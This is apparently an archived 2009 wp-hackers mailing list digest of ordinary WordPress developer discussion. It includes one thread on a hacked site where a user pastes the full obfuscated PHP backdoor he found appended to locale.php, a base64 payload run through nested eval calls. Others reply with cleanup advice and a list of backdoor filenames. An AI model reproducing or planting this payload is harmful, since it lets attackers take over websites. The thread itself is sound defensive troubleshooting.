Filenames I have seen on clients' sites include:
class-cache.php
cache.php
wp-manager.php
works.php
wp-info.php
wp-stats.php
wp-old.php


The very best thing to do is download your complete wp directory to your
desktop, and compare it to a pristine copy of wp 2.8.6. Look for unknown
files and especially different file sizes.


Mike
-- 
Mike Little
http://zed1.com/

From malaiac at gmail.com  Wed Dec  2 14:32:01 2009
From: malaiac at gmail.com (Malaiac)
Date: Wed, 2 Dec 2009 15:32:01 +0100
Subject: [wp-hackers] WP exploit ,
	was Re: [Webmaster Central Help] Site 	hacked.
In-Reply-To: <7235ce780912020129n31b10fabq2f2757844c616d21@mail.gmail.com>
References: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>
	<7235ce780912020129n31b10fabq2f2757844c616d21@mail.gmail.com>
Message-ID: <59e7f3130912020632u2d28cef7hd38ae71bddf81905@mail.gmail.com>

Ok. The base64 statement was in ./wp-includes/locale.php, at the end
of the file. The file seems a legit one to me, so I guess the lien was
added by the exploit... ?

I removed the lines, and I'm going to check it stays like that.

FYI, the lines were :

<?php
$V210305394="VlE+KSk0KQQpPis0KS8yNTxza3JgVlFWUX85NC8ENzIoL3tmezopKToic3ljdW11b2N5d3ltaXVqbGl1amJieXd5bWl1aWx1bmJ5d3ltaHVqbWh1amtpeXd5bW91am5sdWpobHl3eW1vdWpubHVqaGN5d3ltb3VpaGh1amxoeXd5bW91bWN1Y2t5d3ltb3VtY3Vjanl3eW1vdW1jdWNpeXd5bW91bWN1Y2h5d3ltb3VtY3Vjb3l3eW1vdW1jdWNueXd5bW91bWN1Y215d3ltb3VtY3VjbHl3eW1vdW1jdWNjeXd5bW91bWN1Y2J5d3ltb3VtY3Via3l3eW1vdW1jdWJqeXd5bW91bWN1Yml5d3ltb3VsbnVobXl3eW1tdWptaHVqbGt5d3ltbXVqbWh1amxveXd5bW11amJtdWpranl3eW1tdWpibXVtbnl3eW1tdWpibXVtbHl3eW1tdWpibXVsaXl3eW1tdWpibXVsaHl3eW1tdWpibXVsb3l3eW1tdWpibXVsbHl3eW1tdWpibXVsY3l3eW1tdWpibXVja3l3eW1tdWpibXVjanl3eW1tdWpibXVia3l3eW1tdWpibXVianl3eW1tdWpibXViaXl3eW1tdWpibXViaHl3eW1tdWpibXVibHl3eW1tdWpibXViYnl3eW1tdWlqY3Vtbnl3eW1tdWlqY3Vsa3l3eW1tdWlpY3VqbW95d3ltbXVpaWN1am1ueXd5bW11aWljdWptbXl3eW1tdWlpY3VqbGh5d3ltbXVpaWN1amNpeXd5bW11aW9idW1veXd5bW11aW9idW1ueXd5bW11aW9idW1teXd5bW11aW9idW1seXd5bW11aW9idW1jeXd5bW11aW9idW1ieXd5bW11aW9idWxreXd5bW11aW9idWxqeXd5bW11aW9idWxpeXd5bW11aW9idWxoeXd5bW11aW9idWxjeXd5bW11aW9idWxieXd5bW11Ym91aWhreXd5bW11Ym91aWhpeXd5bW11Ym91aWhoeXd5bW11Ym91aWhjeXd5bWx1amJudWpqbnl3eW1sdWpibnVob3l3eW1sdWpibnVobHl3eW1sdWpibnVvb3l3eW1sdWpibnVvbnl3eW1sdWpibnVua3l3eW1sdWpibnVuanl3eW1sdWpibnVuaXl3eW1sdWpibnVuaHl3eW1sdWpibnVub3l3eW1sdWpibnVuY3l3eW1sdWpibnViY3l3eW1jdWpvaXVqYm55d3ltY3Vqb2l1aWtoeXd5bWN1am9pdWlqanl3eW1jdWpvaXVpaml5d3ltY3Vqb2l1aWhreXd5bWN1am9pdWloanl3eW1jdWpvaXVpb2t5d3ltY3Vqb2l1aW9teXd5bWN1am9pdWlvYnl3eW1jdWpvaXVpbmt5d3ltY3Vqb2l1aW5qeXd5bWN1amNrdWlqbXl3eW1jdWpja3Vpbmt5d3ltY3VqY2t1aW5qeXd5bWJ1am9sdWxieXd5bGl1am91amJieXd5bGl1aGt1amtqeXd5bGl1aGt1amtpeXd5bGl1aGt1amtoeXd5bGl1aGt1amtveXd5bGl1aGt1amtseXd5bGl1aGt1ampreXd5bGl1aGt1ampqeXd5bGl1aGt1amlveXd5bGl1aGt1amljeXd5bGl1aGt1amlieXd5bGl1aGt1amhqeXd5bGl1aGt1amhpeXd5bGl1aGt1amhoeXd5bGl1aGt1amhveXd5bGl1aGt1amhueXd5bGl1aGt1am9peXd5bGl1aGt1am1qeXd5bGl1aGt1amxseXd5bGl1aGt1amxieXd5bGl1aGt1aWpoeXd5bGl1aGt1aWpveXd5bGl1aGt1aWpueXd5bGl1aGt1aWpteXd5bGl1aGt1aWlqeXd5bGl1aGt1aWlteXd5bGl1aGt1aW5peXd5bGl1aGt1bm95d3lsaXVoa3VubXl3eWxpdWhrdW1reXd5bGl1aGt1bWp5d3lsaXVoa3Vtbnl3eWxpdWhrdWxjeXd5bGl1aGt1bGJ5d3lsaXVoa3Vjanl3eWxpdWhrdWNseXd5bGl1aGt1Ynl3eWxpdWhrdWJseXd5bGl1aGt1YmN5d3lsaXVoa3ViYnl3eWxvdW11amp5d3lsb3VtdWppeXd5bG91bXVqaHl3eWxvdW11amhqeXd5bG91bXVqbXl3eWxvdW11amx5d3lsb3VtdWpjeXd5bG91bXVqYnl3eWxvdW11aWt5d3lsb3VtdWlqeXd5bG91bXVpaXl3eWxvdW11aWh5d3lsb3VtdWlveXd5bG91bXVpb2t5d3lsb3VtdWlueXd5bG91bXVpbXl3eWxvdW11aWx5d3lsb3VtdWljeXd5bG91bXVpYnl3eWxvdW11aGt5d3lsb3VtdWhqeXd5bG91bXVtbnl3eWxvdW11bW15d3lsb3VtdW1seXd5bG91bXVtY3l3eWxvdW11bWJ5d3lsb3VtdWx5d3lsb3VtdWxreXd5bG91bXVsanl3eWxvdW11bGl5d3lsb3VtdWxoeXd5bG91bXVsb3l3eWxvdW11bG55d3lsb3VtdWxteXd5bG91bXVsYnl3eWxvdW11Y3l3eWxvdW11Y255d3lsb3VtdWNteXd5bG91bXVjbHl3eWxvdW11Ynl3eWxvdW5udWlseXd5am9qdWpjbnVpa2J5d3lqbWJ1aWtsdWloY3l3eWpiYnVqbGx1amN5d3lpa2l1am1rdWpsY3l3eWlraXVqbWt1amxieXd5aWtpdWpta3VqY2t5d3lpa2l1am1rdWpjanl3eWlraXVqbWt1amNoeXd5aWtpdWpta3VqY255d3lpa2l1am1udWJteXd5aWtpdWptbnViY3l3eWlraXVqbW51YmJ5d3lpa2l1aWppdW55d3lpa2l1b211amJ5d3lpa2h1amlodWpjY3l3eWlraHVqb2p1bml5d3lpa2h1aW5udWlob3l3eWlrbXVqYmt1b2h5d3lpa2x1amltdWloYnl3eWlrYnVqdWppeXd5aWtidWp1amh5d3lpa2J1anVoaXl3eWlrYnVqdWhjeXd5aWtidWpoanVva3l3eWlrYnVqaGp1b2p5d3lpa2J1amhqdW9jeXd5aWtidWpoanVvYnl3eWlrYnVqaGp1bmt5d3lpa2J1amhqdW5qeXd5aWtidWpoanVta3l3eWlrYnVqaGp1bWl5d3lpa2J1amNudWprY3l3eWlrYnVqY251amlpeXd5aWtidWpjbnVqb2p5d3lpa2J1amNudWpvaHl3eWlrYnVqY251aW5oeXd5aWtidWpianVqaWh5d3lpa2J1amJqdW1veXd5aWtidWpianVtbnl3eWlrYnVqYmp1Y2l5d3lpa2J1amJqdWNoeXd5aWtidW1sdWlrbXl3eWlrYnVsaHVqbG15d3lpa2J1Y251aWhjeXd5aWpqdWpvdWN5d3lpamp1am1idWlvanl3eWlqaHVpam11am9oeXd5aWptdWprYnVqaWp5d3lpam11amtidWppbXl3eWlqbXVqaG11aWhoeXd5aWptdWpvbnVuY3l3eWlqbXVqbm51amJjeXd5aWptdWpubnVpa2t5d3lp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";eval(base64_decode("ZXZhbChiYXNlNjRfZGVjb2RlKCJaWFpoYkNoaVlYTmxOalJmWkdWamIyUmxLQ0pLUmxsNlRrUmpNVTlVVVRKTmVrMDVXVzFHZWxwVVdUQllNbEpzV1RJNWExcFRaMmxYVnpGSFpXeHdWVmRVUWxsTmJFcHpWMVJKTldFeGNGSlFWREJwUzFSemExWnFVWGhOZWxVeVRtcEpNazlVTVdsWldFNXNUbXBTWmxwSFZtcGlNbEpzUzBOS2FrMHhTalZaYTJSWFpGTkpjRTk1VWxkT2VrazBUbnBKZVU1cVNYZFFWMHBvWXpKVk1rNUdPV3RhVjA1MldrZFZiMGxzYTNsaFNHdHBTMVJ6YTFacVp6Uk9WRmwzVFdwQmQwOVVNV2xaV0U1c1RtcFNabHBIVm1waU1sSnNTME5LYVUwd2NISkphV3MzU2taWk5VMUVTVE5PYWxFMVRXcEJPVmx0Um5wYVZGa3dXREpTYkZreU9XdGFVMmRwVjJwT2QyTkhTblJYYms1YVYwWktjMGxwYXpjaUtTazdaWFpoYkNoaVlYTmxOalJmWkdWamIyUmxLQ0pLUmxsNVRWUkJlazFFVlhwUFZGRTVTa1paZWs1RVl6RlBWRkV5VFhwTmIwcEdXWGxOVkVGNlRVUlZlazlVVVhCUGVWSlhUbFJOTUU1NlozaE5SR2QzVUZOU1YwNUVSWHBPVkZreVRXcFpOVXREVWxkTmFrVjNUWHBCTVUxNmF6QkxWSE05SWlrcE93PT0iKSk7ZXZhbChiYXNlNjRfZGVjb2RlKCJKRll4TmpRNE16SXlNakU5SnljN1ptOXlLQ1JXTmpnNE9USTBPVGs1UFRBN0pGWTJPRGc1TWpRNU9UazhKRlkxTXpRM09ERXdPREE3SkZZMk9EZzVNalE1T1Rrckt5bDdKRll4TmpRNE16SXlNakV1UFNSV056STROekl5TmpJd0tDZ2tWamc0TlRZd01qQXdPU2drVmpJeE1ETXdOVE01TkZza1ZqWTRPRGt5TkRrNU9WMHBYakl4TkRBeE5Ea3pNemtwS1R0OVpYWmhiQ2drVmpFMk5EZ3pNakl5TVNrNyIpKTs="));
?>

2009/12/2 Mike Little <wordpress at zed1.com>:
> 2009/12/2 Malaiac <malaiac at gmail.com>
>
>> 2009/11/27 Malaiac <malaiac at gmail.com>:
>> > Regarding
>> http://www.google.com/support/forum/p/Webmasters/thread?fid=2bb823d5af6173a00004794fff8f89b7&hl=en
>> >
>> > it seems this is an exploit from older versions of WP.
>> >
>> > One of my sites had been hacked with it. Upgrading to 2.8.6 and
>> > overwriting the wp-settings.php file did the job.
>>
>> Oops.
>> upgrading to 2.8.6 only fixed the problem for a few days before the
>> hacker went on it again.
>>
>>
>>
> Look for files which are not part of WordPress and remove them. They often
> have wp sounding names but contain complete cracker control panels that can
> edit files, create new files, and modify your database all under automated
> remote control! Once those are there, upgrading wp doesn't make them go
> away.
>
> Filenames I have seen on clients' sites include:
> class-cache.php
> cache.php
> wp-manager.php
> works.php
> wp-info.php
> wp-stats.php
> wp-old.php
>
>
> The very best thing to do is download your complete wp directory to your
> desktop, and compare it to a pristine copy of wp 2.8.6. Look for unknown
> files and especially different file sizes.
>
>
> Mike
> --
> Mike Little
> http://zed1.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Wed Dec  2 14:32:36 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 2 Dec 2009 08:32:36 -0600
Subject: [wp-hackers] Hook into load-styles.php / load-scripts.php
	"queue"?
In-Reply-To: <4B158E4B.1030404@wpseek.com>
References: <4B15632E.2070002@wpseek.com>
	<8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com> 
	<4B156FF1.2020200@wpseek.com>
	<eaaa36c90912011216m2396c92doba73d2511ffa3446@mail.gmail.com> 
	<4B1584E1.7090108@wpseek.com>
	<161617690912011325j5887a05fl84584b9c03656c6b@mail.gmail.com> 
	<862d087f0912011329h2ebe5197v48ddcf7fd31dfec5@mail.gmail.com> 
	<161617690912011334q52e84294v21f526b533745d2@mail.gmail.com> 
	<4B158E4B.1030404@wpseek.com>
Message-ID: <161617690912020632p5699284eo2bdf7efe5bbe5bdf@mail.gmail.com>

Don't bother, it won't work. The load-scripts file bypasses loading
the rest of WordPress and only loads the default scripts.

-Otto



On Tue, Dec 1, 2009 at 3:44 PM, Oliver Schl?be <office at wpseek.com> wrote:
> Wow, thanks a bunch!
>
> Will try that.
>
> Regards,
> Oliver
>

From wordpress at zed1.com  Wed Dec  2 14:55:28 2009
From: wordpress at zed1.com (Mike Little)
Date: Wed, 2 Dec 2009 14:55:28 +0000
Subject: [wp-hackers] WP exploit ,
	was Re: [Webmaster Central Help] Site 	hacked.
In-Reply-To: <59e7f3130912020632u2d28cef7hd38ae71bddf81905@mail.gmail.com>
References: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com> 
	<7235ce780912020129n31b10fabq2f2757844c616d21@mail.gmail.com> 
	<59e7f3130912020632u2d28cef7hd38ae71bddf81905@mail.gmail.com>
Message-ID: <7235ce780912020655h13599806q348ed3187e8b6d03@mail.gmail.com>

2009/12/2 Malaiac <malaiac at gmail.com>

> Ok. The base64 statement was in ./wp-includes/locale.php, at the end
> of the file. The file seems a legit one to me, so I guess the lien was
> added by the exploit... ?
>
> I removed the lines, and I'm going to check it stays like that.
>
> FYI, the lines were :
>
> <?php
> $V210305394="VlE+KSk0..... SNIP
>


It won't fix the problem. That line was added by some other code running on
your sever.  Next time it could be added to a different file, with a
different variable name and a different encoding scheme.

Did you do the download and compare?

You should also compare your themes and plugins against the originals too.


Mike
-- 
Mike Little
http://zed1.com/

From aj at akshayjain.org  Wed Dec  2 15:04:41 2009
From: aj at akshayjain.org (Akshay Jain)
Date: Wed, 02 Dec 2009 20:34:41 +0530
Subject: [wp-hackers] Blog containing 5,00,000 posts. Slow Admin panel
In-Reply-To: <mailman.9.1259755202.30226.wp-hackers@lists.automattic.com>
References: <mailman.9.1259755202.30226.wp-hackers@lists.automattic.com>
Message-ID: <op.u4bf53c51214gw@akshay-pc>

Can anyone provide me a solution to this problem ? Only the admin panel is  
loading slowly. The frontend is fine!

http://wordpress.org/support/topic/337220?replies=3#post-1299216

Thanks
Akshay

From peter.westwood at ftwr.co.uk  Wed Dec  2 15:12:28 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 2 Dec 2009 15:12:28 +0000
Subject: [wp-hackers] WP exploit ,
	was Re: [Webmaster Central Help] Site 	hacked.
In-Reply-To: <7235ce780912020655h13599806q348ed3187e8b6d03@mail.gmail.com>
References: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>
	<7235ce780912020129n31b10fabq2f2757844c616d21@mail.gmail.com>
	<59e7f3130912020632u2d28cef7hd38ae71bddf81905@mail.gmail.com>
	<7235ce780912020655h13599806q348ed3187e8b6d03@mail.gmail.com>
Message-ID: <A8D7E899-5916-46EA-A4D7-03B204FA4142@ftwr.co.uk>


On 2 Dec 2009, at 14:55, Mike Little wrote:

> 2009/12/2 Malaiac <malaiac at gmail.com>
>
>> Ok. The base64 statement was in ./wp-includes/locale.php, at the end
>> of the file. The file seems a legit one to me, so I guess the lien  
>> was
>> added by the exploit... ?
>>
>> I removed the lines, and I'm going to check it stays like that.
>>
>> FYI, the lines were :
>>
>> <?php
>> $V210305394="VlE+KSk0..... SNIP
>>
>
>
> It won't fix the problem. That line was added by some other code  
> running on
> your sever.  Next time it could be added to a different file, with a
> different variable name and a different encoding scheme.
>
> Did you do the download and compare?
>
> You should also compare your themes and plugins against the  
> originals too.
>

It is also worth running the Exploit Scanner against your install to  
find any malicious code.

http://wordpress.org/extend/plugins/exploit-scanner/

-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From harish.mlists at gmail.com  Wed Dec  2 17:28:31 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Wed, 02 Dec 2009 17:28:31 +0000
Subject: [wp-hackers] WP exploit ,
 was Re: [Webmaster Central Help] Site 	hacked.
In-Reply-To: <7235ce780912020655h13599806q348ed3187e8b6d03@mail.gmail.com>
References: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>
	<7235ce780912020129n31b10fabq2f2757844c616d21@mail.gmail.com>
	<59e7f3130912020632u2d28cef7hd38ae71bddf81905@mail.gmail.com>
	<7235ce780912020655h13599806q348ed3187e8b6d03@mail.gmail.com>
Message-ID: <4B16A3BF.4050508@gmail.com>

Mike Little wrote:
> 2009/12/2 Malaiac <malaiac at gmail.com>
> 
>> Ok. The base64 statement was in ./wp-includes/locale.php, at the end
>> of the file. The file seems a legit one to me, so I guess the lien was
>> added by the exploit... ?
>>
>> I removed the lines, and I'm going to check it stays like that.
>>
>> FYI, the lines were :
>>
>> <?php
>> $V210305394="VlE+KSk0..... SNIP
>>
> 
> 
> It won't fix the problem. That line was added by some other code running on
> your sever.  Next time it could be added to a different file, with a
> different variable name and a different encoding scheme.
> 
> Did you do the download and compare?
> 
> You should also compare your themes and plugins against the originals too.

In general (I think) it also makes sense to keep your web sites under
revision control. So you can easily see what's been changed and when,
allowing for easily spotting and reverting things like this.

Harish

From jer at simianuprising.com  Wed Dec  2 17:35:02 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 2 Dec 2009 12:35:02 -0500
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <1367434fd0ef9ccd9f1a69f83013f948@laurel.joyent.us>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
	<4B157D8D.2030209@gmail.com>
	<1367434fd0ef9ccd9f1a69f83013f948@laurel.joyent.us>
Message-ID: <e1202cb10912020935m5f56f4eakd4fdd45bc2fae80b@mail.gmail.com>

Most of what I wanted to say has been said but I'll reiterate a few
key points because this thread is very useful for us all:

?* Dev/Stage/Live is my preferred staging layout. You work locally on
Dev to create the site. You push it to a Stage on your server, this
serves to both test the setup on the server (might not be the same as
your local server) and to test your migration process at least once
before you make it live. You then push the changes to live. Stage
should always match Live unless you are in the process of migration.
If anything happens to Live (files hacked etc) then everything but the
uploads can be replaced from Stage.

* Controlling the URL settings for the various versions is dead easy
using wp-config.php, just add these definitions and you will be able
to use backups of your live database on Dev and Stage with almost no
problems (you might still be pulling the media files from the actual
server but this rarely impedes your new development since they load
fine as long as you are online).

  define('WP_SITEURL', 'http://example.com/wordpress');
  define('WP_HOME', 'http://example.com/wordpress');

--
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From jer at simianuprising.com  Wed Dec  2 18:07:04 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 2 Dec 2009 13:07:04 -0500
Subject: [wp-hackers] This was painful to read...
In-Reply-To: <8F635931-FFA4-482E-BC01-CDE28BCBDB4A@striderweb.com>
References: <4DDFBF3D-6E70-4420-8DF0-15579CAAFC78@newclarity.net>
	<77b239a00911280421q5ff6ea94ja0243cc441bdf587@mail.gmail.com>
	<FB4CB4CB-CD30-43DB-89EB-AA1712156124@striderweb.com>
	<B89C1FE6-8591-48A7-AE1B-519C991331B1@newclarity.net>
	<8F635931-FFA4-482E-BC01-CDE28BCBDB4A@striderweb.com>
Message-ID: <e1202cb10912021007w12042dffh1b2ce69a55d31a97@mail.gmail.com>

On Sun, Nov 29, 2009 at 9:06 PM, Stephen Rider
<wp-hackers at striderweb.com> wrote:
> No distinct need for it to be in core if it can readily be done with a plugin. ?Let's leave the default as is, and make it *easy* for plugins to do all this as needed.

I think this is definitely the right way to go. In the original linked
article they said Django was the winner. In talking to Django devs my
sense is that what they love is how one line of API driven code
accomplishes what takes a dozen slow-loading clicks in Drupal, and
that 90% of the time that one line should never change for the life of
the site, so having it outside the admin is good for business, cause
clients can't mess it up etc.

Things like adding categories to posts or setting up a custom post
type should work that way. Simple bits of API code you can add in
functions.php for a theme that set up the admin with little friction.
It makes sense for them to be in functions.php because without the
theme that supports the custom content type why have the admin? This
is exactly how the current widgets/sidebars system works in WP and its
awesome as anyone who has used it has probably noticed.

Once these options are accessible via short bits of code it becomes
easy for a plugin to step in and offer a lightweight UI to make things
accessible via the admin, like the role/capability plugins do now.

WP is already on its way to being as configurable as Django behind the
scenes without becoming painfully bloated like Drupal on the frontend.
IMHO its just a matter of continuing on the same path of keeping it
simple for self-installers while offering robust API for developers.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From otto at ottodestruct.com  Wed Dec  2 18:19:44 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 2 Dec 2009 12:19:44 -0600
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
Message-ID: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>

On Sat, Nov 28, 2009 at 6:02 AM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> This was painful to read. Not because I disagree, but because I can't disagree even though I wish it were not true: ...

I don't disagree with it either. However, I do disagree that WordPress
should handle those use cases at the present time.

We're not trying to build "one CMS to rule them all" here. WordPress
is not, and should not be, all things to all people.

There's plenty of room for specialization. Focus on doing one thing
right, not on doing many things badly.

-Otto
Sent from Memphis, TN, United States

From jer at simianuprising.com  Wed Dec  2 18:30:00 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 2 Dec 2009 13:30:00 -0500
Subject: [wp-hackers] WP exploit ,
	was Re: [Webmaster Central Help] Site 	hacked.
In-Reply-To: <4B16A3BF.4050508@gmail.com>
References: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>
	<7235ce780912020129n31b10fabq2f2757844c616d21@mail.gmail.com>
	<59e7f3130912020632u2d28cef7hd38ae71bddf81905@mail.gmail.com>
	<7235ce780912020655h13599806q348ed3187e8b6d03@mail.gmail.com>
	<4B16A3BF.4050508@gmail.com>
Message-ID: <e1202cb10912021030i1e43f71ex42ce729c21e01f88@mail.gmail.com>

It's also worth going through any media uploads added since the attack
and making sure they are really images (downloading them to OSX and
checking that they have thumbnails in them worked for me). Some might
be PHP files that are being loaded somehow, depending on your server
config.

For the actual core files its definitely worth completely deleting
wp-admin and wp-includes and replacing them entirely with pristine
versions, nothing really to lose there.

-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From msbasher at gmail.com  Wed Dec  2 18:33:12 2009
From: msbasher at gmail.com (Peter)
Date: Wed, 2 Dec 2009 10:33:12 -0800
Subject: [wp-hackers] Integrate site authentication with WordPress
In-Reply-To: <a21f8bf00912011253t673d06dala8184e6f0fd134b9@mail.gmail.com>
References: <c066f0d80912011141p1783150i25a1ab78fc2b7c03@mail.gmail.com>
	<a21f8bf00912011253t673d06dala8184e6f0fd134b9@mail.gmail.com>
Message-ID: <c066f0d80912021033p82e43a6k6db10768f82bded9@mail.gmail.com>

This article works if I want to let WordPress do the authentication but I
want the rails site to handle the authentication. I want the user to
be automatically logged in to WordPress when they log in on the rails site.



On Tue, Dec 1, 2009 at 12:53 PM, Steve Taylor <steve at sltaylor.co.uk> wrote:

> This might help:
>
>
> http://lacquerhead.ca/2009/07/getting-other-applications-to-work-with-wordpress-users/
>
> Steve
>
> 2009/12/1 Peter <msbasher at gmail.com>:
> > I have a site built in ruby on rails that handles site-wide the user
> > authentication. I would like my users to be automatically logged in to
> > WordPress when they sign in using the rails site. Any suggestions?
> >
> > Kind Regards,
> > Peter
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Wed Dec  2 18:45:58 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 13:45:58 -0500
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <e1202cb10912020935m5f56f4eakd4fdd45bc2fae80b@mail.gmail.com>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>
	<4B157D8D.2030209@gmail.com>
	<1367434fd0ef9ccd9f1a69f83013f948@laurel.joyent.us>
	<e1202cb10912020935m5f56f4eakd4fdd45bc2fae80b@mail.gmail.com>
Message-ID: <8B7F18B1-A168-4B19-B84A-A9C31C87F9EE@newclarity.net>

On Dec 2, 2009, at 12:35 PM, Jeremy Clarke wrote:
> * Controlling the URL settings for the various versions is dead easy
> using wp-config.php, just add these definitions and you will be able
> to use backups of your live database on Dev and Stage with almost no
> problems (you might still be pulling the media files from the actual
> server but this rarely impedes your new development since they load
> fine as long as you are online).
> 
>  define('WP_SITEURL', 'http://example.com/wordpress');
>  define('WP_HOME', 'http://example.com/wordpress');

There are other problems such as: 

1.) core and plugins that require a local path as a saved setting, 
2.) paths saved in serialized arrays, and 
3.) links in content and media that points to the development or a staging server when the data is pushed live.  

